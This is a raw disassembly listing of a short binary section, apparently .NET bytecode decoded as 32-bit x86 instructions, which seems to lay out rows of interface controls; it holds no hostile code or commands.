  403017:	00 00                	add    %al,(%eax)
  403019:	04 16                	add    $0x16,%al
  40301b:	32 4c 02 7b          	xor    0x7b(%edx,%eax,1),%cl
  40301f:	2e 00 00             	add    %al,%cs:(%eax)
  403022:	04 16                	add    $0x16,%al
  403024:	32 28                	xor    (%eax),%ch
  403026:	02 7b 30             	add    0x30(%ebx),%bh
  403029:	00 00                	add    %al,(%eax)
  40302b:	04 02                	add    $0x2,%al
  40302d:	7b 2d                	jnp    0x40305c
  40302f:	00 00                	add    %al,(%eax)
  403031:	04 6f                	add    $0x6f,%al
  403033:	86 00                	xchg   %al,(%eax)
  403035:	00 0a                	add    %cl,(%edx)
  403037:	7b 33                	jnp    0x40306c
  403039:	00 00                	add    %al,(%eax)
  40303b:	04 02                	add    $0x2,%al
  40303d:	7b 2e                	jnp    0x40306d
  40303f:	00 00                	add    %al,(%eax)
  403041:	04 6f                	add    $0x6f,%al
  403043:	87 00                	xchg   %eax,(%eax)
  403045:	00 0a                	add    %cl,(%edx)
  403047:	02 15 7d 2e 00 00    	add    0x2e7d,%dl
  40304d:	04 02                	add    $0x2,%al
  40304f:	7b 30                	jnp    0x403081
  403051:	00 00                	add    %al,(%eax)
  403053:	04 02                	add    $0x2,%al
  403055:	7b 2d                	jnp    0x403084
  403057:	00 00                	add    %al,(%eax)
  403059:	04 6f                	add    $0x6f,%al
  40305b:	86 00                	xchg   %al,(%eax)
  40305d:	00 0a                	add    %cl,(%edx)
  40305f:	7b 33                	jnp    0x403094
  403061:	00 00                	add    %al,(%eax)
  403063:	04 6f                	add    $0x6f,%al
  403065:	88 00                	mov    %al,(%eax)
  403067:	00 0a                	add    %cl,(%edx)
  403069:	02 16                	add    (%esi),%dl
  40306b:	7d 2f                	jge    0x40309c
  40306d:	00 00                	add    %al,(%eax)
  40306f:	04 2a                	add    $0x2a,%al
  403071:	00 00                	add    %al,(%eax)
  403073:	00 03                	add    %al,(%ebx)
  403075:	30 04 00             	xor    %al,(%eax,%eax,1)
  403078:	83 02 00             	addl   $0x0,(%edx)
  40307b:	00 00                	add    %al,(%eax)
  40307d:	00 00                	add    %al,(%eax)
  40307f:	00 03                	add    %al,(%ebx)
  403081:	73 2e                	jae    0x4030b1
  403083:	00 00                	add    %al,(%eax)
  403085:	0a 7d 31             	or     0x31(%ebp),%bh
  403088:	00 00                	add    %al,(%eax)
  40308a:	04 03                	add    $0x3,%al
  40308c:	7b 31                	jnp    0x4030bf
  40308e:	00 00                	add    %al,(%eax)
  403090:	04 1b                	add    $0x1b,%al
  403092:	6f                   	outsl  %ds:(%esi),(%dx)
  403093:	89 00                	mov    %eax,(%eax)
  403095:	00 0a                	add    %cl,(%edx)
  403097:	03 7b 31             	add    0x31(%ebx),%edi
  40309a:	00 00                	add    %al,(%eax)
  40309c:	04 1f                	add    $0x1f,%al
  40309e:	68 04 5a 1f 0a       	push   $0xa1f5a04
  4030a3:	58                   	pop    %eax
  4030a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4030a5:	8a 00                	mov    (%eax),%al
  4030a7:	00 0a                	add    %cl,(%edx)
  4030a9:	03 7b 31             	add    0x31(%ebx),%edi
  4030ac:	00 00                	add    %al,(%eax)
  4030ae:	04 20                	add    $0x20,%al
  4030b0:	0c 03                	or     $0x3,%al
  4030b2:	00 00                	add    %al,(%eax)
  4030b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4030b5:	5b                   	pop    %ebx
  4030b6:	00 00                	add    %al,(%eax)
  4030b8:	0a 03                	or     (%ebx),%al
  4030ba:	7b 31                	jnp    0x4030ed
  4030bc:	00 00                	add    %al,(%eax)
  4030be:	04 1f                	add    $0x1f,%al
  4030c0:	10 6f 5a             	adc    %ch,0x5a(%edi)
  4030c3:	00 00                	add    %al,(%eax)
  4030c5:	0a 03                	or     (%ebx),%al
  4030c7:	7b 31                	jnp    0x4030fa
  4030c9:	00 00                	add    %al,(%eax)
  4030cb:	04 03                	add    $0x3,%al
  4030cd:	7b 31                	jnp    0x403100
  4030cf:	00 00                	add    %al,(%eax)
  4030d1:	04 6f                	add    $0x6f,%al
  4030d3:	8b 00                	mov    (%eax),%eax
  4030d5:	00 0a                	add    %cl,(%edx)
  4030d7:	17                   	pop    %ss
  4030d8:	73 8c                	jae    0x403066
  4030da:	00 00                	add    %al,(%eax)
  4030dc:	0a 6f 8d             	or     -0x73(%edi),%ch
  4030df:	00 00                	add    %al,(%eax)
  4030e1:	0a 03                	or     (%ebx),%al
  4030e3:	7b 31                	jnp    0x403116
  4030e5:	00 00                	add    %al,(%eax)
  4030e7:	04 72                	add    $0x72,%al
  4030e9:	01 00                	add    %eax,(%eax)
  4030eb:	00 70 6f             	add    %dh,0x6f(%eax)
  4030ee:	31 00                	xor    %eax,(%eax)
  4030f0:	00 0a                	add    %cl,(%edx)
  4030f2:	02 28                	add    (%eax),%ch
  4030f4:	3a 00                	cmp    (%eax),%al
  4030f6:	00 0a                	add    %cl,(%edx)
  4030f8:	03 7b 31             	add    0x31(%ebx),%edi
  4030fb:	00 00                	add    %al,(%eax)
  4030fd:	04 6f                	add    $0x6f,%al
  4030ff:	3b 00                	cmp    (%eax),%eax
  403101:	00 0a                	add    %cl,(%edx)
  403103:	03 73 2e             	add    0x2e(%ebx),%esi
  403106:	00 00                	add    %al,(%eax)
  403108:	0a 7d 32             	or     0x32(%ebp),%bh
  40310b:	00 00                	add    %al,(%eax)
  40310d:	04 03                	add    $0x3,%al
  40310f:	7b 32                	jnp    0x403143
  403111:	00 00                	add    %al,(%eax)
  403113:	04 1f                	add    $0x1f,%al
  403115:	19 6f 89             	sbb    %ebp,-0x77(%edi)
  403118:	00 00                	add    %al,(%eax)
  40311a:	0a 03                	or     (%ebx),%al
  40311c:	7b 32                	jnp    0x403150
  40311e:	00 00                	add    %al,(%eax)
  403120:	04 1f                	add    $0x1f,%al
  403122:	68 04 5a 1f 1a       	push   $0x1a1f5a04
  403127:	58                   	pop    %eax
  403128:	6f                   	outsl  %ds:(%esi),(%dx)
  403129:	8a 00                	mov    (%eax),%al
  40312b:	00 0a                	add    %cl,(%edx)
  40312d:	03 7b 32             	add    0x32(%ebx),%edi
  403130:	00 00                	add    %al,(%eax)
  403132:	04 20                	add    $0x20,%al
  403134:	f8                   	clc
  403135:	02 00                	add    (%eax),%al
  403137:	00 6f 5b             	add    %ch,0x5b(%edi)
  40313a:	00 00                	add    %al,(%eax)
  40313c:	0a 03                	or     (%ebx),%al
  40313e:	7b 32                	jnp    0x403172
  403140:	00 00                	add    %al,(%eax)
  403142:	04 1f                	add    $0x1f,%al
  403144:	10 6f 5a             	adc    %ch,0x5a(%edi)
  403147:	00 00                	add    %al,(%eax)
  403149:	0a 03                	or     (%ebx),%al
  40314b:	7b 32                	jnp    0x40317f
  40314d:	00 00                	add    %al,(%eax)
  40314f:	04 72                	add    $0x72,%al
  403151:	01 00                	add    %eax,(%eax)
  403153:	00 70 6f             	add    %dh,0x6f(%eax)
  403156:	31 00                	xor    %eax,(%eax)
  403158:	00 0a                	add    %cl,(%edx)
  40315a:	02 28                	add    (%eax),%ch
  40315c:	3a 00                	cmp    (%eax),%al
  40315e:	00 0a                	add    %cl,(%edx)
  403160:	03 7b 32             	add    0x32(%ebx),%edi
  403163:	00 00                	add    %al,(%eax)
  403165:	04 6f                	add    $0x6f,%al
  403167:	3b 00                	cmp    (%eax),%eax
  403169:	00 0a                	add    %cl,(%edx)
  40316b:	03 73 8e             	add    -0x72(%ebx),%esi
  40316e:	00 00                	add    %al,(%eax)
  403170:	0a 7d 33             	or     0x33(%ebp),%bh
  403173:	00 00                	add    %al,(%eax)
  403175:	04 03                	add    $0x3,%al
  403177:	7b 33                	jnp    0x4031ac
  403179:	00 00                	add    %al,(%eax)
  40317b:	04 16                	add    $0x16,%al
  40317d:	6f                   	outsl  %ds:(%esi),(%dx)
  40317e:	87 00                	xchg   %eax,(%eax)
  403180:	00 0a                	add    %cl,(%edx)
  403182:	03 7b 33             	add    0x33(%ebx),%edi
  403185:	00 00                	add    %al,(%eax)
  403187:	04 16                	add    $0x16,%al
  403189:	6f                   	outsl  %ds:(%esi),(%dx)
  40318a:	8f 00                	pop    (%eax)
  40318c:	00 0a                	add    %cl,(%edx)
  40318e:	03 7b 33             	add    0x33(%ebx),%edi
  403191:	00 00                	add    %al,(%eax)
  403193:	04 02                	add    $0x2,%al
  403195:	02 7b 2a             	add    0x2a(%ebx),%bh
  403198:	00 00                	add    %al,(%eax)
  40319a:	04 28                	add    $0x28,%al
  40319c:	2c 00                	sub    $0x0,%al
  40319e:	00 06                	add    %al,(%esi)
  4031a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4031a1:	90                   	nop
  4031a2:	00 00                	add    %al,(%eax)
  4031a4:	0a 03                	or     (%ebx),%al
  4031a6:	7b 38                	jnp    0x4031e0
  4031a8:	00 00                	add    %al,(%eax)
  4031aa:	04 1f                	add    $0x1f,%al
  4031ac:	0f 2f 3a             	comiss (%edx),%xmm7
  4031af:	03 7b 33             	add    0x33(%ebx),%edi
  4031b2:	00 00                	add    %al,(%eax)
  4031b4:	04 20                	add    $0x20,%al
  4031b6:	e4 02                	in     $0x2,%al
  4031b8:	00 00                	add    %al,(%eax)
  4031ba:	1f                   	pop    %ds
  4031bb:	1e                   	push   %ds
  4031bc:	03 7b 38             	add    0x38(%ebx),%edi
  4031bf:	00 00                	add    %al,(%eax)
  4031c1:	04 5a                	add    $0x5a,%al
  4031c3:	59                   	pop    %ecx
  4031c4:	1f                   	pop    %ds
  4031c5:	14 73                	adc    $0x73,%al
  4031c7:	37                   	aaa
  4031c8:	00 00                	add    %al,(%eax)
  4031ca:	0a 6f 91             	or     -0x6f(%edi),%ch
  4031cd:	00 00                	add    %al,(%eax)
  4031cf:	0a 03                	or     (%ebx),%al
  4031d1:	7b 33                	jnp    0x403206
  4031d3:	00 00                	add    %al,(%eax)
  4031d5:	04 1f                	add    $0x1f,%al
  4031d7:	19 1f                	sbb    %ebx,(%edi)
  4031d9:	1e                   	push   %ds
  4031da:	03 7b 38             	add    0x38(%ebx),%edi
  4031dd:	00 00                	add    %al,(%eax)
  4031df:	04 5a                	add    $0x5a,%al
  4031e1:	58                   	pop    %eax
  4031e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4031e3:	89 00                	mov    %eax,(%eax)
  4031e5:	00 0a                	add    %cl,(%edx)
  4031e7:	2b 27                	sub    (%edi),%esp
  4031e9:	03 7b 33             	add    0x33(%ebx),%edi
  4031ec:	00 00                	add    %al,(%eax)
  4031ee:	04 20                	add    $0x20,%al
  4031f0:	22 01                	and    (%ecx),%al
  4031f2:	00 00                	add    %al,(%eax)
  4031f4:	1f                   	pop    %ds
  4031f5:	14 73                	adc    $0x73,%al
  4031f7:	37                   	aaa
  4031f8:	00 00                	add    %al,(%eax)
  4031fa:	0a 6f 91             	or     -0x6f(%edi),%ch
  4031fd:	00 00                	add    %al,(%eax)
  4031ff:	0a 03                	or     (%ebx),%al
  403201:	7b 33                	jnp    0x403236
  403203:	00 00                	add    %al,(%eax)
  403205:	04 20                	add    $0x20,%al
  403207:	db 01                	fildl  (%ecx)
  403209:	00 00                	add    %al,(%eax)
  40320b:	6f                   	outsl  %ds:(%esi),(%dx)
  40320c:	89 00                	mov    %eax,(%eax)
  40320e:	00 0a                	add    %cl,(%edx)
  403210:	03 7b 33             	add    0x33(%ebx),%edi
  403213:	00 00                	add    %al,(%eax)
  403215:	04 1f                	add    $0x1f,%al
  403217:	68 04 5a 1f 2f       	push   $0x2f1f5a04
  40321c:	58                   	pop    %eax
  40321d:	6f                   	outsl  %ds:(%esi),(%dx)
  40321e:	8a 00                	mov    (%eax),%al
  403220:	00 0a                	add    %cl,(%edx)
  403222:	02 28                	add    (%eax),%ch
  403224:	3a 00                	cmp    (%eax),%al
  403226:	00 0a                	add    %cl,(%edx)
  403228:	03 7b 33             	add    0x33(%ebx),%edi
  40322b:	00 00                	add    %al,(%eax)
  40322d:	04 6f                	add    $0x6f,%al
  40322f:	3b 00                	cmp    (%eax),%eax
  403231:	00 0a                	add    %cl,(%edx)
  403233:	03 73 2e             	add    0x2e(%ebx),%esi
  403236:	00 00                	add    %al,(%eax)
  403238:	0a 7d 34             	or     0x34(%ebp),%bh
  40323b:	00 00                	add    %al,(%eax)
  40323d:	04 03                	add    $0x3,%al
  40323f:	7b 34                	jnp    0x403275
  403241:	00 00                	add    %al,(%eax)
  403243:	04 1b                	add    $0x1b,%al
  403245:	6f                   	outsl  %ds:(%esi),(%dx)
  403246:	89 00                	mov    %eax,(%eax)
  403248:	00 0a                	add    %cl,(%edx)
  40324a:	03 7b 34             	add    0x34(%ebx),%edi
  40324d:	00 00                	add    %al,(%eax)
  40324f:	04 1f                	add    $0x1f,%al
  403251:	68 04 5a 1f 48       	push   $0x481f5a04
  403256:	58                   	pop    %eax
  403257:	6f                   	outsl  %ds:(%esi),(%dx)
  403258:	8a 00                	mov    (%eax),%al
  40325a:	00 0a                	add    %cl,(%edx)
  40325c:	03 7b 34             	add    0x34(%ebx),%edi
  40325f:	00 00                	add    %al,(%eax)
  403261:	04 20                	add    $0x20,%al
  403263:	0c 03                	or     $0x3,%al
  403265:	00 00                	add    %al,(%eax)
  403267:	6f                   	outsl  %ds:(%esi),(%dx)
  403268:	5b                   	pop    %ebx
  403269:	00 00                	add    %al,(%eax)
  40326b:	0a 03                	or     (%ebx),%al
  40326d:	7b 34                	jnp    0x4032a3
  40326f:	00 00                	add    %al,(%eax)
  403271:	04 1f                	add    $0x1f,%al
  403273:	10 6f 5a             	adc    %ch,0x5a(%edi)
  403276:	00 00                	add    %al,(%eax)
  403278:	0a 03                	or     (%ebx),%al
  40327a:	7b 34                	jnp    0x4032b0
  40327c:	00 00                	add    %al,(%eax)
  40327e:	04 72                	add    $0x72,%al
  403280:	01 00                	add    %eax,(%eax)
  403282:	00 70 6f             	add    %dh,0x6f(%eax)
  403285:	31 00                	xor    %eax,(%eax)
  403287:	00 0a                	add    %cl,(%edx)
  403289:	02 28                	add    (%eax),%ch
  40328b:	3a 00                	cmp    (%eax),%al
  40328d:	00 0a                	add    %cl,(%edx)
  40328f:	03 7b 34             	add    0x34(%ebx),%edi
  403292:	00 00                	add    %al,(%eax)
  403294:	04 6f                	add    $0x6f,%al
  403296:	3b 00                	cmp    (%eax),%eax
  403298:	00 0a                	add    %cl,(%edx)
  40329a:	03 73 2e             	add    0x2e(%ebx),%esi
  40329d:	00 00                	add    %al,(%eax)
  40329f:	0a 7d 35             	or     0x35(%ebp),%bh
  4032a2:	00 00                	add    %al,(%eax)
  4032a4:	04 03                	add    $0x3,%al
  4032a6:	7b 35                	jnp    0x4032dd
  4032a8:	00 00                	add    %al,(%eax)
  4032aa:	04 1f                	add    $0x1f,%al
  4032ac:	19 6f 89             	sbb    %ebp,-0x77(%edi)
  4032af:	00 00                	add    %al,(%eax)
  4032b1:	0a 03                	or     (%ebx),%al
  4032b3:	7b 35                	jnp    0x4032ea
  4032b5:	00 00                	add    %al,(%eax)
  4032b7:	04 1f                	add    $0x1f,%al
  4032b9:	68 04 5a 1f 58       	push   $0x581f5a04
  4032be:	58                   	pop    %eax
  4032bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c0:	8a 00                	mov    (%eax),%al
  4032c2:	00 0a                	add    %cl,(%edx)
  4032c4:	03 7b 35             	add    0x35(%ebx),%edi
  4032c7:	00 00                	add    %al,(%eax)
  4032c9:	04 20                	add    $0x20,%al
  4032cb:	f8                   	clc
  4032cc:	02 00                	add    (%eax),%al
  4032ce:	00 6f 5b             	add    %ch,0x5b(%edi)
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	0a 03                	or     (%ebx),%al
  4032d5:	7b 35                	jnp    0x40330c
  4032d7:	00 00                	add    %al,(%eax)
  4032d9:	04 1f                	add    $0x1f,%al
  4032db:	10 6f 5a             	adc    %ch,0x5a(%edi)
  4032de:	00 00                	add    %al,(%eax)
  4032e0:	0a 03                	or     (%ebx),%al
  4032e2:	7b 35                	jnp    0x403319
  4032e4:	00 00                	add    %al,(%eax)
  4032e6:	04 72                	add    $0x72,%al
  4032e8:	01 00                	add    %eax,(%eax)
  4032ea:	00 70 6f             	add    %dh,0x6f(%eax)
  4032ed:	31 00                	xor    %eax,(%eax)
  4032ef:	00 0a                	add    %cl,(%edx)
  4032f1:	02 28                	add    (%eax),%ch
  4032f3:	3a 00                	cmp    (%eax),%al
  4032f5:	00 0a                	add    %cl,(%edx)
  4032f7:	03 7b 35             	add    0x35(%ebx),%edi
  4032fa:	00 00                	add    %al,(%eax)
  4032fc:	04 6f                	add    $0x6f,%al
  4032fe:	3b 00                	cmp    (%eax),%eax
  403300:	00 0a                	add    %cl,(%edx)
  403302:	2a 32                	sub    (%edx),%dh
  403304:	02 7b 30             	add    0x30(%ebx),%bh
  403307:	00 00                	add    %al,(%eax)
  403309:	04 6f                	add    $0x6f,%al
  40330b:	92                   	xchg   %eax,%edx
  40330c:	00 00                	add    %al,(%eax)
  40330e:	0a 2a                	or     (%edx),%ch
  403310:	13 30                	adc    (%eax),%esi
  403312:	06                   	push   %es
  403313:	00 3a                	add    %bh,(%edx)
  403315:	08 00                	or     %al,(%eax)
  403317:	00 0a                	add    %cl,(%edx)
  403319:	00 00                	add    %al,(%eax)
  40331b:	11 03                	adc    %eax,(%ebx)
  40331d:	2d 01 2a 15 0a       	sub    $0xa152a01,%eax
  403322:	16                   	push   %ss
  403323:	0b 2b                	or     (%ebx),%ebp
  403325:	21 02                	and    %eax,(%edx)
  403327:	7b 30                	jnp    0x403359
  403329:	00 00                	add    %al,(%eax)
  40332b:	04 07                	add    $0x7,%al
  40332d:	6f                   	outsl  %ds:(%esi),(%dx)
  40332e:	86 00                	xchg   %al,(%eax)
  403330:	00 0a                	add    %cl,(%edx)
  403332:	7b 36                	jnp    0x40336a
  403334:	00 00                	add    %al,(%eax)
  403336:	04 03                	add    $0x3,%al
  403338:	6f                   	outsl  %ds:(%esi),(%dx)
  403339:	93                   	xchg   %eax,%ebx
  40333a:	00 00                	add    %al,(%eax)
  40333c:	0a 33                	or     (%ebx),%dh
  40333e:	04 07                	add    $0x7,%al
  403340:	0a 2b                	or     (%ebx),%ch
  403342:	12 07                	adc    (%edi),%al
  403344:	17                   	pop    %ss
  403345:	58                   	pop    %eax
  403346:	0b 07                	or     (%edi),%eax
  403348:	02 7b 30             	add    0x30(%ebx),%bh
  40334b:	00 00                	add    %al,(%eax)
  40334d:	04 6f                	add    $0x6f,%al
  40334f:	92                   	xchg   %eax,%edx
  403350:	00 00                	add    %al,(%eax)
  403352:	0a 32                	or     (%edx),%dh
  403354:	d1 03                	roll   $1,(%ebx)
  403356:	6f                   	outsl  %ds:(%esi),(%dx)
  403357:	94                   	xchg   %eax,%esp
  403358:	00 00                	add    %al,(%eax)
  40335a:	0a 17                	or     (%edi),%dl
  40335c:	40                   	inc    %eax
  40335d:	c1 02 00             	roll   $0x0,(%edx)
  403360:	00 06                	add    %al,(%esi)
  403362:	16                   	push   %ss
  403363:	3f                   	aas
  403364:	16                   	push   %ss
  403365:	01 00                	add    %eax,(%eax)
  403367:	00 02                	add    %al,(%edx)
  403369:	7b 2d                	jnp    0x403398
  40336b:	00 00                	add    %al,(%eax)
  40336d:	04 06                	add    $0x6,%al
  40336f:	33 07                	xor    (%edi),%eax
  403371:	02 15 7d 2d 00 00    	add    0x2d7d,%dl
  403377:	04 02                	add    $0x2,%al
  403379:	28 3a                	sub    %bh,(%edx)
  40337b:	00 00                	add    %al,(%eax)
  40337d:	0a 02                	or     (%edx),%al
  40337f:	7b 30                	jnp    0x4033b1
  403381:	00 00                	add    %al,(%eax)
  403383:	04 06                	add    $0x6,%al
  403385:	6f                   	outsl  %ds:(%esi),(%dx)
  403386:	86 00                	xchg   %al,(%eax)
  403388:	00 0a                	add    %cl,(%edx)
  40338a:	7b 31                	jnp    0x4033bd
  40338c:	00 00                	add    %al,(%eax)
  40338e:	04 6f                	add    $0x6f,%al
  403390:	95                   	xchg   %eax,%ebp
  403391:	00 00                	add    %al,(%eax)
  403393:	0a 02                	or     (%edx),%al
  403395:	28 3a                	sub    %bh,(%edx)
  403397:	00 00                	add    %al,(%eax)
  403399:	0a 02                	or     (%edx),%al
  40339b:	7b 30                	jnp    0x4033cd
  40339d:	00 00                	add    %al,(%eax)
  40339f:	04 06                	add    $0x6,%al
  4033a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4033a2:	86 00                	xchg   %al,(%eax)
  4033a4:	00 0a                	add    %cl,(%edx)
  4033a6:	7b 32                	jnp    0x4033da
  4033a8:	00 00                	add    %al,(%eax)
  4033aa:	04 6f                	add    $0x6f,%al
  4033ac:	95                   	xchg   %eax,%ebp
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	0a 02                	or     (%edx),%al
  4033b1:	28 3a                	sub    %bh,(%edx)
  4033b3:	00 00                	add    %al,(%eax)
  4033b5:	0a 02                	or     (%edx),%al
  4033b7:	7b 30                	jnp    0x4033e9
  4033b9:	00 00                	add    %al,(%eax)
  4033bb:	04 06                	add    $0x6,%al
  4033bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4033be:	86 00                	xchg   %al,(%eax)
  4033c0:	00 0a                	add    %cl,(%edx)
  4033c2:	7b 33                	jnp    0x4033f7
  4033c4:	00 00                	add    %al,(%eax)
  4033c6:	04 6f                	add    $0x6f,%al
  4033c8:	95                   	xchg   %eax,%ebp
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	0a 02                	or     (%edx),%al
  4033cd:	28 3a                	sub    %bh,(%edx)
  4033cf:	00 00                	add    %al,(%eax)
  4033d1:	0a 02                	or     (%edx),%al
  4033d3:	7b 30                	jnp    0x403405
  4033d5:	00 00                	add    %al,(%eax)
  4033d7:	04 06                	add    $0x6,%al
  4033d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4033da:	86 00                	xchg   %al,(%eax)
  4033dc:	00 0a                	add    %cl,(%edx)
  4033de:	7b 34                	jnp    0x403414
  4033e0:	00 00                	add    %al,(%eax)
  4033e2:	04 6f                	add    $0x6f,%al
  4033e4:	95                   	xchg   %eax,%ebp
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	0a 02                	or     (%edx),%al
  4033e9:	28 3a                	sub    %bh,(%edx)
  4033eb:	00 00                	add    %al,(%eax)
  4033ed:	0a 02                	or     (%edx),%al
  4033ef:	7b 30                	jnp    0x403421
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	04 06                	add    $0x6,%al
  4033f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4033f6:	86 00                	xchg   %al,(%eax)
  4033f8:	00 0a                	add    %cl,(%edx)
  4033fa:	7b 35                	jnp    0x403431
  4033fc:	00 00                	add    %al,(%eax)
  4033fe:	04 6f                	add    $0x6f,%al
  403400:	95                   	xchg   %eax,%ebp
  403401:	00 00                	add    %al,(%eax)
  403403:	0a 02                	or     (%edx),%al
  403405:	7b 30                	jnp    0x403437
  403407:	00 00                	add    %al,(%eax)
  403409:	04 06                	add    $0x6,%al
  40340b:	6f                   	outsl  %ds:(%esi),(%dx)
  40340c:	86 00                	xchg   %al,(%eax)
  40340e:	00 0a                	add    %cl,(%edx)
  403410:	7b 31                	jnp    0x403443
  403412:	00 00                	add    %al,(%eax)
  403414:	04 6f                	add    $0x6f,%al
  403416:	96                   	xchg   %eax,%esi
  403417:	00 00                	add    %al,(%eax)
  403419:	0a 02                	or     (%edx),%al
  40341b:	7b 30                	jnp    0x40344d
  40341d:	00 00                	add    %al,(%eax)
  40341f:	04 06                	add    $0x6,%al
  403421:	6f                   	outsl  %ds:(%esi),(%dx)
  403422:	86 00                	xchg   %al,(%eax)
  403424:	00 0a                	add    %cl,(%edx)
  403426:	7b 32                	jnp    0x40345a
  403428:	00 00                	add    %al,(%eax)
  40342a:	04 6f                	add    $0x6f,%al
  40342c:	96                   	xchg   %eax,%esi
  40342d:	00 00                	add    %al,(%eax)
  40342f:	0a 02                	or     (%edx),%al
  403431:	7b 30                	jnp    0x403463
  403433:	00 00                	add    %al,(%eax)
  403435:	04 06                	add    $0x6,%al
  403437:	6f                   	outsl  %ds:(%esi),(%dx)
  403438:	86 00                	xchg   %al,(%eax)
  40343a:	00 0a                	add    %cl,(%edx)
  40343c:	7b 33                	jnp    0x403471
  40343e:	00 00                	add    %al,(%eax)
  403440:	04 6f                	add    $0x6f,%al
  403442:	96                   	xchg   %eax,%esi
  403443:	00 00                	add    %al,(%eax)
  403445:	0a 02                	or     (%edx),%al
  403447:	7b 30                	jnp    0x403479
  403449:	00 00                	add    %al,(%eax)
  40344b:	04 06                	add    $0x6,%al
  40344d:	6f                   	outsl  %ds:(%esi),(%dx)
  40344e:	86 00                	xchg   %al,(%eax)
  403450:	00 0a                	add    %cl,(%edx)
  403452:	7b 34                	jnp    0x403488
  403454:	00 00                	add    %al,(%eax)
  403456:	04 6f                	add    $0x6f,%al
  403458:	96                   	xchg   %eax,%esi
  403459:	00 00                	add    %al,(%eax)
  40345b:	0a 02                	or     (%edx),%al
  40345d:	7b 30                	jnp    0x40348f
  40345f:	00 00                	add    %al,(%eax)
  403461:	04 06                	add    $0x6,%al
  403463:	6f                   	outsl  %ds:(%esi),(%dx)
  403464:	86 00                	xchg   %al,(%eax)
  403466:	00 0a                	add    %cl,(%edx)
  403468:	7b 35                	jnp    0x40349f
  40346a:	00 00                	add    %al,(%eax)
  40346c:	04 6f                	add    $0x6f,%al
  40346e:	96                   	xchg   %eax,%esi
  40346f:	00 00                	add    %al,(%eax)
  403471:	0a 02                	or     (%edx),%al
  403473:	7b 30                	jnp    0x4034a5
  403475:	00 00                	add    %al,(%eax)
  403477:	04 06                	add    $0x6,%al
  403479:	6f                   	outsl  %ds:(%esi),(%dx)
  40347a:	97                   	xchg   %eax,%edi
  40347b:	00 00                	add    %al,(%eax)
  40347d:	0a 02                	or     (%edx),%al
  40347f:	7b 30                	jnp    0x4034b1
  403481:	00 00                	add    %al,(%eax)
  403483:	04 6f                	add    $0x6f,%al
  403485:	92                   	xchg   %eax,%edx
  403486:	00 00                	add    %al,(%eax)
  403488:	0a 2d 1d 02 7b 2c    	or     0x2c7b021d,%ch
  40348e:	00 00                	add    %al,(%eax)
  403490:	04 6f                	add    $0x6f,%al
  403492:	98                   	cwtl
  403493:	00 00                	add    %al,(%eax)
  403495:	0a 02                	or     (%edx),%al
  403497:	7b 2c                	jnp    0x4034c5
  403499:	00 00                	add    %al,(%eax)
  40349b:	04 6f                	add    $0x6f,%al
  40349d:	96                   	xchg   %eax,%esi
  40349e:	00 00                	add    %al,(%eax)
  4034a0:	0a 02                	or     (%edx),%al
  4034a2:	28 17                	sub    %dl,(%edi)
  4034a4:	00 00                	add    %al,(%eax)
  4034a6:	0a 2a                	or     (%edx),%ch
  4034a8:	06                   	push   %es
  4034a9:	16                   	push   %ss
  4034aa:	2f                   	das
  4034ab:	01 2a                	add    %ebp,(%edx)
  4034ad:	06                   	push   %es
  4034ae:	0c 38                	or     $0x38,%al
  4034b0:	95                   	xchg   %eax,%ebp
  4034b1:	00 00                	add    %al,(%eax)
  4034b3:	00 02                	add    %al,(%edx)
  4034b5:	7b 30                	jnp    0x4034e7
  4034b7:	00 00                	add    %al,(%eax)
  4034b9:	04 08                	add    $0x8,%al
  4034bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4034bc:	86 00                	xchg   %al,(%eax)
  4034be:	00 0a                	add    %cl,(%edx)
  4034c0:	7b 31                	jnp    0x4034f3
  4034c2:	00 00                	add    %al,(%eax)
  4034c4:	04 1f                	add    $0x1f,%al
  4034c6:	68 08 5a 1f 0a       	push   $0xa1f5a08
  4034cb:	58                   	pop    %eax
  4034cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4034cd:	8a 00                	mov    (%eax),%al
  4034cf:	00 0a                	add    %cl,(%edx)
  4034d1:	02 7b 30             	add    0x30(%ebx),%bh
  4034d4:	00 00                	add    %al,(%eax)
  4034d6:	04 08                	add    $0x8,%al
  4034d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4034d9:	86 00                	xchg   %al,(%eax)
  4034db:	00 0a                	add    %cl,(%edx)
  4034dd:	7b 32                	jnp    0x403511
  4034df:	00 00                	add    %al,(%eax)
  4034e1:	04 1f                	add    $0x1f,%al
  4034e3:	68 08 5a 1f 1a       	push   $0x1a1f5a08
  4034e8:	58                   	pop    %eax
  4034e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4034ea:	8a 00                	mov    (%eax),%al
  4034ec:	00 0a                	add    %cl,(%edx)
  4034ee:	02 7b 30             	add    0x30(%ebx),%bh
  4034f1:	00 00                	add    %al,(%eax)
  4034f3:	04 08                	add    $0x8,%al
  4034f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4034f6:	86 00                	xchg   %al,(%eax)
  4034f8:	00 0a                	add    %cl,(%edx)
  4034fa:	7b 33                	jnp    0x40352f
  4034fc:	00 00                	add    %al,(%eax)
  4034fe:	04 1f                	add    $0x1f,%al
  403500:	68 08 5a 1f 2f       	push   $0x2f1f5a08
  403505:	58                   	pop    %eax
  403506:	6f                   	outsl  %ds:(%esi),(%dx)
  403507:	8a 00                	mov    (%eax),%al
  403509:	00 0a                	add    %cl,(%edx)
  40350b:	02 7b 30             	add    0x30(%ebx),%bh
  40350e:	00 00                	add    %al,(%eax)
  403510:	04 08                	add    $0x8,%al
  403512:	6f                   	outsl  %ds:(%esi),(%dx)
  403513:	86 00                	xchg   %al,(%eax)
  403515:	00 0a                	add    %cl,(%edx)
  403517:	7b 34                	jnp    0x40354d
  403519:	00 00                	add    %al,(%eax)
  40351b:	04 1f                	add    $0x1f,%al
